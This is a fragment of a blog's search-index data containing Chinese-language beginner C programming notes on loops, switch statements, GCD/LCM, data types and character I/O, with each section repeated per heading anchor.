if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#双目"},{"categories":["Programing"],"content":"\r4.1循环\r数位数算法 int x ; int n=0 ; scanf_s(\"%d\",\u0026x); n++; x=x/10; while(x\u003e0){ n++; x=x/10; } printf(\"该数字是%d位数\",n); 一个int是4个字节，一个字节是8位，int可表示最大数范围：2^(4*8)=2147483648 while语句 while ( x \u003e 0 ) { ... ... } do-while语句 do { \u003c循环体语句\u003e }while(\u003c循环体语句\u003e); 统计数字位数 #include\u003cstdio.h\u003e int main(){ int num=0; int count=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ num=num/10; count++; }while(num!=0); printf(\"total:%d\",count); return 0; } 逆向输出数字串 #include\u003cstdio.h\u003e int main(){ int num=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ printf(\"%d\",num%10); num=num/10; }while(num!=0); return 0; } 求1!+2!+3!+……..n! #include\u003cstdio.h\u003e double fact(int n); int main(){ int a=0; double sum=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026a); for(int i=1;i\u003c=a;i++){ sum=sum+fact(i); } printf(\"1!+2!+3!+....+%d!=%.0lf\\n\",a,sum); return 0; } double fact(int n){ double result=0; if(n\u003c0){ return 0; } result=1; for(int i=1;i\u003c=n;i++){ result=result*i; } return result; } while 和 do-while的区别：while先判断，do-while先执行一次 ","date":"2023-11-17","objectID":"/c_language_notes/:4:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#41循环"},{"categories":["Programing"],"content":"\r4.1循环\r数位数算法 int x ; int n=0 ; scanf_s(\"%d\",\u0026x); n++; x=x/10; while(x\u003e0){ n++; x=x/10; } printf(\"该数字是%d位数\",n); 一个int是4个字节，一个字节是8位，int可表示最大数范围：2^(4*8)=2147483648 while语句 while ( x \u003e 0 ) { ... ... } do-while语句 do { \u003c循环体语句\u003e }while(\u003c循环体语句\u003e); 统计数字位数 #include int main(){ int num=0; int count=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ num=num/10; count++; }while(num!=0); printf(\"total:%d\",count); return 0; } 逆向输出数字串 #include int main(){ int num=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ printf(\"%d\",num%10); num=num/10; }while(num!=0); return 0; } 求1!+2!+3!+……..n! #include double fact(int n); int main(){ int a=0; double sum=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026a); for(int i=1;i\u003c=a;i++){ sum=sum+fact(i); } printf(\"1!+2!+3!+....+%d!=%.0lf\\n\",a,sum); return 0; } double fact(int n){ double result=0; if(n\u003c0){ return 0; } result=1; for(int i=1;i\u003c=n;i++){ result=result*i; } return result; } while 和 do-while的区别：while先判断，do-while先执行一次 ","date":"2023-11-17","objectID":"/c_language_notes/:4:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数位数算法"},{"categories":["Programing"],"content":"\r4.1循环\r数位数算法 int x ; int n=0 ; scanf_s(\"%d\",\u0026x); n++; x=x/10; while(x\u003e0){ n++; x=x/10; } printf(\"该数字是%d位数\",n); 一个int是4个字节，一个字节是8位，int可表示最大数范围：2^(4*8)=2147483648 while语句 while ( x \u003e 0 ) { ... ... } do-while语句 do { \u003c循环体语句\u003e }while(\u003c循环体语句\u003e); 统计数字位数 #include int main(){ int num=0; int count=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ num=num/10; count++; }while(num!=0); printf(\"total:%d\",count); return 0; } 逆向输出数字串 #include int main(){ int num=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ printf(\"%d\",num%10); num=num/10; }while(num!=0); return 0; } 求1!+2!+3!+……..n! #include double fact(int n); int main(){ int a=0; double sum=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026a); for(int i=1;i\u003c=a;i++){ sum=sum+fact(i); } printf(\"1!+2!+3!+....+%d!=%.0lf\\n\",a,sum); return 0; } double fact(int n){ double result=0; if(n\u003c0){ return 0; } result=1; for(int i=1;i\u003c=n;i++){ result=result*i; } return result; } while 和 do-while的区别：while先判断，do-while先执行一次 ","date":"2023-11-17","objectID":"/c_language_notes/:4:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#while语句"},{"categories":["Programing"],"content":"\r4.1循环\r数位数算法 int x ; int n=0 ; scanf_s(\"%d\",\u0026x); n++; x=x/10; while(x\u003e0){ n++; x=x/10; } printf(\"该数字是%d位数\",n); 一个int是4个字节，一个字节是8位，int可表示最大数范围：2^(4*8)=2147483648 while语句 while ( x \u003e 0 ) { ... ... } do-while语句 do { \u003c循环体语句\u003e }while(\u003c循环体语句\u003e); 统计数字位数 #include int main(){ int num=0; int count=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ num=num/10; count++; }while(num!=0); printf(\"total:%d\",count); return 0; } 逆向输出数字串 #include int main(){ int num=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ printf(\"%d\",num%10); num=num/10; }while(num!=0); return 0; } 求1!+2!+3!+……..n! #include double fact(int n); int main(){ int a=0; double sum=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026a); for(int i=1;i\u003c=a;i++){ sum=sum+fact(i); } printf(\"1!+2!+3!+....+%d!=%.0lf\\n\",a,sum); return 0; } double fact(int n){ double result=0; if(n\u003c0){ return 0; } result=1; for(int i=1;i\u003c=n;i++){ result=result*i; } return result; } while 和 do-while的区别：while先判断，do-while先执行一次 ","date":"2023-11-17","objectID":"/c_language_notes/:4:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#do-while语句"},{"categories":["Programing"],"content":"\r4.1循环\r数位数算法 int x ; int n=0 ; scanf_s(\"%d\",\u0026x); n++; x=x/10; while(x\u003e0){ n++; x=x/10; } printf(\"该数字是%d位数\",n); 一个int是4个字节，一个字节是8位，int可表示最大数范围：2^(4*8)=2147483648 while语句 while ( x \u003e 0 ) { ... ... } do-while语句 do { \u003c循环体语句\u003e }while(\u003c循环体语句\u003e); 统计数字位数 #include int main(){ int num=0; int count=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ num=num/10; count++; }while(num!=0); printf(\"total:%d\",count); return 0; } 逆向输出数字串 #include int main(){ int num=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ printf(\"%d\",num%10); num=num/10; }while(num!=0); return 0; } 求1!+2!+3!+……..n! #include double fact(int n); int main(){ int a=0; double sum=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026a); for(int i=1;i\u003c=a;i++){ sum=sum+fact(i); } printf(\"1!+2!+3!+....+%d!=%.0lf\\n\",a,sum); return 0; } double fact(int n){ double result=0; if(n\u003c0){ return 0; } result=1; for(int i=1;i\u003c=n;i++){ result=result*i; } return result; } while 和 do-while的区别：while先判断，do-while先执行一次 ","date":"2023-11-17","objectID":"/c_language_notes/:4:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#统计数字位数"},{"categories":["Programing"],"content":"\r4.1循环\r数位数算法 int x ; int n=0 ; scanf_s(\"%d\",\u0026x); n++; x=x/10; while(x\u003e0){ n++; x=x/10; } printf(\"该数字是%d位数\",n); 一个int是4个字节，一个字节是8位，int可表示最大数范围：2^(4*8)=2147483648 while语句 while ( x \u003e 0 ) { ... ... } do-while语句 do { \u003c循环体语句\u003e }while(\u003c循环体语句\u003e); 统计数字位数 #include int main(){ int num=0; int count=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ num=num/10; count++; }while(num!=0); printf(\"total:%d\",count); return 0; } 逆向输出数字串 #include int main(){ int num=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ printf(\"%d\",num%10); num=num/10; }while(num!=0); return 0; } 求1!+2!+3!+……..n! #include double fact(int n); int main(){ int a=0; double sum=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026a); for(int i=1;i\u003c=a;i++){ sum=sum+fact(i); } printf(\"1!+2!+3!+....+%d!=%.0lf\\n\",a,sum); return 0; } double fact(int n){ double result=0; if(n\u003c0){ return 0; } result=1; for(int i=1;i\u003c=n;i++){ result=result*i; } return result; } while 和 do-while的区别：while先判断，do-while先执行一次 ","date":"2023-11-17","objectID":"/c_language_notes/:4:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#逆向输出数字串"},{"categories":["Programing"],"content":"\r4.1循环\r数位数算法 int x ; int n=0 ; scanf_s(\"%d\",\u0026x); n++; x=x/10; while(x\u003e0){ n++; x=x/10; } printf(\"该数字是%d位数\",n); 一个int是4个字节，一个字节是8位，int可表示最大数范围：2^(4*8)=2147483648 while语句 while ( x \u003e 0 ) { ... ... } do-while语句 do { \u003c循环体语句\u003e }while(\u003c循环体语句\u003e); 统计数字位数 #include int main(){ int num=0; int count=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ num=num/10; count++; }while(num!=0); printf(\"total:%d\",count); return 0; } 逆向输出数字串 #include int main(){ int num=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ printf(\"%d\",num%10); num=num/10; }while(num!=0); return 0; } 求1!+2!+3!+……..n! #include double fact(int n); int main(){ int a=0; double sum=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026a); for(int i=1;i\u003c=a;i++){ sum=sum+fact(i); } printf(\"1!+2!+3!+....+%d!=%.0lf\\n\",a,sum); return 0; } double fact(int n){ double result=0; if(n\u003c0){ return 0; } result=1; for(int i=1;i\u003c=n;i++){ result=result*i; } return result; } while 和 do-while的区别：while先判断，do-while先执行一次 ","date":"2023-11-17","objectID":"/c_language_notes/:4:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#求123n"},{"categories":["Programing"],"content":"\r4.1循环\r数位数算法 int x ; int n=0 ; scanf_s(\"%d\",\u0026x); n++; x=x/10; while(x\u003e0){ n++; x=x/10; } printf(\"该数字是%d位数\",n); 一个int是4个字节，一个字节是8位，int可表示最大数范围：2^(4*8)=2147483648 while语句 while ( x \u003e 0 ) { ... ... } do-while语句 do { \u003c循环体语句\u003e }while(\u003c循环体语句\u003e); 统计数字位数 #include int main(){ int num=0; int count=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ num=num/10; count++; }while(num!=0); printf(\"total:%d\",count); return 0; } 逆向输出数字串 #include int main(){ int num=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ printf(\"%d\",num%10); num=num/10; }while(num!=0); return 0; } 求1!+2!+3!+……..n! #include double fact(int n); int main(){ int a=0; double sum=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026a); for(int i=1;i\u003c=a;i++){ sum=sum+fact(i); } printf(\"1!+2!+3!+....+%d!=%.0lf\\n\",a,sum); return 0; } double fact(int n){ double result=0; if(n\u003c0){ return 0; } result=1; for(int i=1;i\u003c=n;i++){ result=result*i; } return result; } while 和 do-while的区别：while先判断，do-while先执行一次 ","date":"2023-11-17","objectID":"/c_language_notes/:4:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#while-和-do-while的区别"},{"categories":["Programing"],"content":"\r4.2循环应用\r计数循环 int count = 100; while(count \u003e=0){ cout --; printf(\"%d\\n\",count); } printf(\"发射\\n\"); 格雷公式求π近似值 #include\u003cstdio.h\u003e #include\u003cmath.h\u003e int main(){ int demo=1; int flag=1; double eps,pi=0; double item=1.0; printf(\"Enter eps:\"); scanf(\"%lf\",\u0026eps); while(fabs(item)\u003e=eps){ pi=pi+item; flag=-flag; demo=demo+2; item=flag*(1.0/demo); } pi=pi+item; pi=pi*4; printf(\"pi=%.4f\\n\",pi); return 0; } 随机数每次召唤rand()就得到一个随机数 ","date":"2023-11-17","objectID":"/c_language_notes/:4:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#42循环应用"},{"categories":["Programing"],"content":"\r4.2循环应用\r计数循环 int count = 100; while(count \u003e=0){ cout --; printf(\"%d\\n\",count); } printf(\"发射\\n\"); 格雷公式求π近似值 #include #include int main(){ int demo=1; int flag=1; double eps,pi=0; double item=1.0; printf(\"Enter eps:\"); scanf(\"%lf\",\u0026eps); while(fabs(item)\u003e=eps){ pi=pi+item; flag=-flag; demo=demo+2; item=flag*(1.0/demo); } pi=pi+item; pi=pi*4; printf(\"pi=%.4f\\n\",pi); return 0; } 随机数每次召唤rand()就得到一个随机数 ","date":"2023-11-17","objectID":"/c_language_notes/:4:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#计数循环"},{"categories":["Programing"],"content":"\r4.2循环应用\r计数循环 int count = 100; while(count \u003e=0){ cout --; printf(\"%d\\n\",count); } printf(\"发射\\n\"); 格雷公式求π近似值 #include #include int main(){ int demo=1; int flag=1; double eps,pi=0; double item=1.0; printf(\"Enter eps:\"); scanf(\"%lf\",\u0026eps); while(fabs(item)\u003e=eps){ pi=pi+item; flag=-flag; demo=demo+2; item=flag*(1.0/demo); } pi=pi+item; pi=pi*4; printf(\"pi=%.4f\\n\",pi); return 0; } 随机数每次召唤rand()就得到一个随机数 ","date":"2023-11-17","objectID":"/c_language_notes/:4:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#格雷公式求π近似值"},{"categories":["Programing"],"content":"\r4.2循环应用\r计数循环 int count = 100; while(count \u003e=0){ cout --; printf(\"%d\\n\",count); } printf(\"发射\\n\"); 格雷公式求π近似值 #include #include int main(){ int demo=1; int flag=1; double eps,pi=0; double item=1.0; printf(\"Enter eps:\"); scanf(\"%lf\",\u0026eps); while(fabs(item)\u003e=eps){ pi=pi+item; flag=-flag; demo=demo+2; item=flag*(1.0/demo); } pi=pi+item; pi=pi*4; printf(\"pi=%.4f\\n\",pi); return 0; } 随机数每次召唤rand()就得到一个随机数 ","date":"2023-11-17","objectID":"/c_language_notes/:4:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#随机数"},{"categories":["Programing"],"content":"\r5.1循环控制\r阶乘算法 int n; scanf_s(\"%d\",\u0026n); int fact = 1; int i =1; for(i=1;i\u003c=n;i++){ fact*=i; } printf(\"%d!=%d\\n\",n,fact); for循环语句 for (初始条件;循环继续的条件;循环结束后执行的语句) { } for像一个计数循环 Tips 如果有固定次数，用for语句更合适 如果必须执行一次，用do_while 其他情况用while 10 5 3 2 ","date":"2023-11-17","objectID":"/c_language_notes/:5:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#51循环控制"},{"categories":["Programing"],"content":"\r5.1循环控制\r阶乘算法 int n; scanf_s(\"%d\",\u0026n); int fact = 1; int i =1; for(i=1;i\u003c=n;i++){ fact*=i; } printf(\"%d!=%d\\n\",n,fact); for循环语句 for (初始条件;循环继续的条件;循环结束后执行的语句) { } for像一个计数循环 Tips 如果有固定次数，用for语句更合适 如果必须执行一次，用do_while 其他情况用while 10 5 3 2 ","date":"2023-11-17","objectID":"/c_language_notes/:5:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#阶乘算法"},{"categories":["Programing"],"content":"\r5.1循环控制\r阶乘算法 int n; scanf_s(\"%d\",\u0026n); int fact = 1; int i =1; for(i=1;i\u003c=n;i++){ fact*=i; } printf(\"%d!=%d\\n\",n,fact); for循环语句 for (初始条件;循环继续的条件;循环结束后执行的语句) { } for像一个计数循环 Tips 如果有固定次数，用for语句更合适 如果必须执行一次，用do_while 其他情况用while 10 5 3 2 ","date":"2023-11-17","objectID":"/c_language_notes/:5:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#for循环语句"},{"categories":["Programing"],"content":"\r5.1循环控制\r阶乘算法 int n; scanf_s(\"%d\",\u0026n); int fact = 1; int i =1; for(i=1;i\u003c=n;i++){ fact*=i; } printf(\"%d!=%d\\n\",n,fact); for循环语句 for (初始条件;循环继续的条件;循环结束后执行的语句) { } for像一个计数循环 Tips 如果有固定次数，用for语句更合适 如果必须执行一次，用do_while 其他情况用while 10 5 3 2 ","date":"2023-11-17","objectID":"/c_language_notes/:5:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#tips"},{"categories":["Programing"],"content":"\r5.2循环控制\rbreak和continuebreak：当 break 关键字用于 while、for 循环时，会终止循环而执行整个循环语句后面的代码。break 关键字通常和 if 语句一起使用，即满足条件时便跳出循环。 continue：跳过循环这一轮剩下的语句，进入下一轮 接力break\rgoto语句（在多重嵌套的循环中，要从内层跳出，用goto语句 直接跳到标志位置 ","date":"2023-11-17","objectID":"/c_language_notes/:5:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#52循环控制"},{"categories":["Programing"],"content":"\r5.2循环控制\rbreak和continuebreak：当 break 关键字用于 while、for 循环时，会终止循环而执行整个循环语句后面的代码。break 关键字通常和 if 语句一起使用，即满足条件时便跳出循环。 continue：跳过循环这一轮剩下的语句，进入下一轮 接力break\rgoto语句（在多重嵌套的循环中，要从内层跳出，用goto语句 直接跳到标志位置 ","date":"2023-11-17","objectID":"/c_language_notes/:5:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#break和continue"},{"categories":["Programing"],"content":"\r5.2循环控制\rbreak和continuebreak：当 break 关键字用于 while、for 循环时，会终止循环而执行整个循环语句后面的代码。break 关键字通常和 if 语句一起使用，即满足条件时便跳出循环。 continue：跳过循环这一轮剩下的语句，进入下一轮 接力break\rgoto语句（在多重嵌套的循环中，要从内层跳出，用goto语句 直接跳到标志位置 ","date":"2023-11-17","objectID":"/c_language_notes/:5:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#接力break"},{"categories":["Programing"],"content":"\r5.2循环控制\rbreak和continuebreak：当 break 关键字用于 while、for 循环时，会终止循环而执行整个循环语句后面的代码。break 关键字通常和 if 语句一起使用，即满足条件时便跳出循环。 continue：跳过循环这一轮剩下的语句，进入下一轮 接力break\rgoto语句（在多重嵌套的循环中，要从内层跳出，用goto语句 直接跳到标志位置 ","date":"2023-11-17","objectID":"/c_language_notes/:5:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#goto语句"},{"categories":["Programing"],"content":"\r5.3循环应用\r求最大公约数\r1.枚举算法 #include \u003cstdio.h\u003e int main() { int a, b; int min; scanf(\"%d %d\", \u0026a, \u0026b); if (a \u003e b) { min = b; } else { min = a; } int ret = 0; int i; for (i = 1; i \u003c min; i++) { if (a % i == 0) { if (b % i == 0) { ret = i; } } } printf(\"%d和%d的最大公约数为%d.\\n\", a, b, ret); } 2.辗转相除法\r#include \u003cstdio.h\u003e int main() { int a, b; int t; scanf_s(\"%d %d\", \u0026a, \u0026b); while (b != 0) { t = a % b; a = b; b = t; printf(\"a=%d,b=%d,t=%d\\n\",a,b,t); } printf(\"gcd=%d\\n\", a); return 0; } 求最小公倍数 int main() { int a = 0, b = 0; scanf(\"%d %d\", \u0026a, \u0026b); int i = 1; while ((a * i) % b != 0) { i++; } printf(\"%d\\n\", i * a); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:5:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#53循环应用"},{"categories":["Programing"],"content":"\r5.3循环应用\r求最大公约数\r1.枚举算法 #include int main() { int a, b; int min; scanf(\"%d %d\", \u0026a, \u0026b); if (a \u003e b) { min = b; } else { min = a; } int ret = 0; int i; for (i = 1; i \u003c min; i++) { if (a % i == 0) { if (b % i == 0) { ret = i; } } } printf(\"%d和%d的最大公约数为%d.\\n\", a, b, ret); } 2.辗转相除法\r#include int main() { int a, b; int t; scanf_s(\"%d %d\", \u0026a, \u0026b); while (b != 0) { t = a % b; a = b; b = t; printf(\"a=%d,b=%d,t=%d\\n\",a,b,t); } printf(\"gcd=%d\\n\", a); return 0; } 求最小公倍数 int main() { int a = 0, b = 0; scanf(\"%d %d\", \u0026a, \u0026b); int i = 1; while ((a * i) % b != 0) { i++; } printf(\"%d\\n\", i * a); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:5:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#求最大公约数"},{"categories":["Programing"],"content":"\r5.3循环应用\r求最大公约数\r1.枚举算法 #include int main() { int a, b; int min; scanf(\"%d %d\", \u0026a, \u0026b); if (a \u003e b) { min = b; } else { min = a; } int ret = 0; int i; for (i = 1; i \u003c min; i++) { if (a % i == 0) { if (b % i == 0) { ret = i; } } } printf(\"%d和%d的最大公约数为%d.\\n\", a, b, ret); } 2.辗转相除法\r#include int main() { int a, b; int t; scanf_s(\"%d %d\", \u0026a, \u0026b); while (b != 0) { t = a % b; a = b; b = t; printf(\"a=%d,b=%d,t=%d\\n\",a,b,t); } printf(\"gcd=%d\\n\", a); return 0; } 求最小公倍数 int main() { int a = 0, b = 0; scanf(\"%d %d\", \u0026a, \u0026b); int i = 1; while ((a * i) % b != 0) { i++; } printf(\"%d\\n\", i * a); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:5:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#1枚举算法"},{"categories":["Programing"],"content":"\r5.3循环应用\r求最大公约数\r1.枚举算法 #include int main() { int a, b; int min; scanf(\"%d %d\", \u0026a, \u0026b); if (a \u003e b) { min = b; } else { min = a; } int ret = 0; int i; for (i = 1; i \u003c min; i++) { if (a % i == 0) { if (b % i == 0) { ret = i; } } } printf(\"%d和%d的最大公约数为%d.\\n\", a, b, ret); } 2.辗转相除法\r#include int main() { int a, b; int t; scanf_s(\"%d %d\", \u0026a, \u0026b); while (b != 0) { t = a % b; a = b; b = t; printf(\"a=%d,b=%d,t=%d\\n\",a,b,t); } printf(\"gcd=%d\\n\", a); return 0; } 求最小公倍数 int main() { int a = 0, b = 0; scanf(\"%d %d\", \u0026a, \u0026b); int i = 1; while ((a * i) % b != 0) { i++; } printf(\"%d\\n\", i * a); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:5:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#2辗转相除法"},{"categories":["Programing"],"content":"\r5.3循环应用\r求最大公约数\r1.枚举算法 #include int main() { int a, b; int min; scanf(\"%d %d\", \u0026a, \u0026b); if (a \u003e b) { min = b; } else { min = a; } int ret = 0; int i; for (i = 1; i \u003c min; i++) { if (a % i == 0) { if (b % i == 0) { ret = i; } } } printf(\"%d和%d的最大公约数为%d.\\n\", a, b, ret); } 2.辗转相除法\r#include int main() { int a, b; int t; scanf_s(\"%d %d\", \u0026a, \u0026b); while (b != 0) { t = a % b; a = b; b = t; printf(\"a=%d,b=%d,t=%d\\n\",a,b,t); } printf(\"gcd=%d\\n\", a); return 0; } 求最小公倍数 int main() { int a = 0, b = 0; scanf(\"%d %d\", \u0026a, \u0026b); int i = 1; while ((a * i) % b != 0) { i++; } printf(\"%d\\n\", i * a); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:5:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#求最小公倍数"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char\u003cshort\u003cint\u003cfloat\u003cdouble sizeof给出某个类型或变量在内存中所占据的字节数 sizeof()是一个静态运算符，不能在括号内进行运算 #include \u003cstdio.h\u003e int main() { int a; a = 6; printf(\"sizeof(double)=%ld\\n\", sizeof(long double)); printf(\"sizeof(a)=%ld\\n\", sizeof(a)); return 0; } 补码\runsigned\r整数越界\r整数的输入输出\rint类型输入输出形式： 十进制：%d 八进制：%o 十六进制：%x 八进制和十六进制\r十六进制很适合表达二进制数据，因为四位二进制正好是一个十六进制位 整数类型的选择\r所以说，没有特殊需要，就选择int 浮点类型\r实数类型，即实型，又称为浮点型，指存在小数部分的数。浮点型数据有单精度浮点型和双精度浮点型两种。 实型常量即实数，又称为浮点数，都是双精度浮点型，%e可输出科学计数法。 科学计数法\r输出小数 #include \u003cstdio.h\u003e int main() { double ff = 1e-10; printf(\"%e,%f\\n\", ff, ff); return 0; } 这样的话，%e显示的科学计数法可以表示，但用%f输出的单精小数无法显示具体数值， printf(\"%e,%.16f\\n\", ff, ff); 添加.16来修改输出的小数点后面的位数 宽度限定词指定数据的输出宽度， 整型数据的输出格式控制说明%md，制定了数据的输出宽度为m(包含符号位) 若数据的实际位数小于m，则左侧补空格，若大于m，则按实际位数输出 实型数据的输出格式控制说明%m.nf，指定了输出浮点型数据时保留n位小数，且输出宽度是m(包括符号位和小数点)(同时实际位数小于m左端补空格，大于m按实际输出) 超过范围的浮点数printf输出inf表示超过范围的浮点数 printf输出nan表示不存在的浮点数 浮点运算的精度\r带小数点的字面量是double而非float float需要用f或F后缀来表明身份 选择浮点类型​ 没有特殊需要就选double ​ 现代CPU能直接对double做硬件运算，性能不会比float差，在64位的机器上，数据存储的速度也不比float慢 字符类型char是一种整数，也是一种字符类型 printf和scanf里用%c来输入输出字符 以上这段代码中，c是整数1，d是字符'1’，故输出的结果为不相等 字符的输入输出\r字符数据的输入输出可以调用函数scanf()、printf()、getchar()、putchar() getchar()从键盘输入一个字符，并赋值给变量 putchar()输出一个字符，调用格式为：putchar(输出参数); 若要实现多字符的输入和输出，就要循环调用putchar和getchar,下面给出一个栗子： #include\u003cstdio.h\u003e int main(){ char ch; int first=1,k; printf(\"Enter 8 characters:\"); for(k=1;k\u003c=8;k++){ ch = getchar(); if(first==1){ putchar(ch); first=0; }else{ putchar('-'); putchar(ch); } } return 0; } 字符计算\r大小写转换 字母在ASCII表中是顺序排列的 大写字母和小写字母是分开排列的，并不在一起 ‘a’-‘A’可以得到两段之间的距离，于是 ​ a+‘a’-‘A’可以把一个大写字母变成小写字母 ​ a+‘A’-‘a’可以把一个小写字母变成大写字母 eg.输入一行字符，以回车符’\\n’结束输入，将其中的大写字母转换为相应的小写字母，小写字母转换为相应的大写字母，其他字符原样输出 #include\u003cstdio.h\u003e int main(){ printf(\"Input characters:\"); char ch; ch=getchar(); while(ch!='\\n'){ if(ch\u003e='A'\u0026\u0026ch\u003c='Z'){ ch=ch-'A'+'a'; } else if(ch\u003e='a'\u0026\u0026ch\u003c='z'){ ch=ch-'a'+'A'; } putchar(ch); //输出转换后的字符 ch=getchar(); } return 0; } 逃逸字符​ 用来表达无法印出来的控制字符或特殊字符，它由一个反斜杠\"\\\"开头，后面跟上另一个字符，这两个字符合起来，组成了一个字符 ​ 举个栗子： printf(\"请分别输入身高的英尺和英寸。\"“如输入\\\"5 7 \\\"表示5英尺7英寸:\"); 不同的shell会对特殊字符有不同的处理方式 比如\\b有些shell会解释为退一个(但不是删除，如果有新字符录入，则会覆盖) 转义字符由反斜杠加一个字符或数字组成，它把反斜杠后的字符或数字转换成别的意义，虽然转义字符形式上由多个字符组成，但它是字符常量，只代表一个字符。 自动类型转换当运算符的两边出现不一致的类型时，会自动转换成较大的类型 大的意思是能表达的数的范围更大 对于printf，任何小于int的类型会被转换成int，float会被转换成double 但是scanf不会，要输入short，需要%hd 强制类型转换要把一个量强制转换成另一个类型(通常是一个较小的类型) 格式：(类型)值 例如：(int)10.2 注意这时候的安全性，小的变量不总能表达大的变量 强制类型转换的优先级高于四则运算 整数的类型转换强制类型转换(大转小)或遇高级时自动转换(小转大) bool #include\u003cstdbool.h\u003e 之后就可以使用bool和true、false 当然，用printf输出的时候只能输出1或者0，无法输出true或者false ","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#61数据类型"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数据的储存"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 